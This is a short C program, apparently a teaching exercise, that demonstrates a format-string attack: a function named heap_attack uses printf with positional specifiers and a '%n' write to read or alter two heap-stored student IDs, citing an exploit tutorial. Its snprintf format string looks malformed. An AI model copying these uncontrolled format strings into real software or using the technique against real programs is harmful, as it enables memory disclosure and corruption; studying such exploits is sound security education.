#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void heap_attack(void) { //https://axcheron.github.io/exploit-101-format-strings/
	char buffer[17];

	int s1_index = 12;
	int offset = s1_index * sizeof(unsigned long);
	
	snprintf(buffer, sizeof(buffer), "%*c%$n", offset - 1);
	printf("s1: %12$s\n\n");
	printf("s2: %13$s\n\n");

}

int main(void) {
	char* s1 = malloc(9);
	if (s1 == NULL) { return 1; }
	char* s2 = malloc(9);
	if (s2 == NULL) { return 1; }


	strcpy(s1, "s4816587");
	strcpy(s2, "s1234567");

	heap_attack();

	printf("student 1: %s\n", s1); 
	printf("student 2: %s\n", s2);
	return 0;
}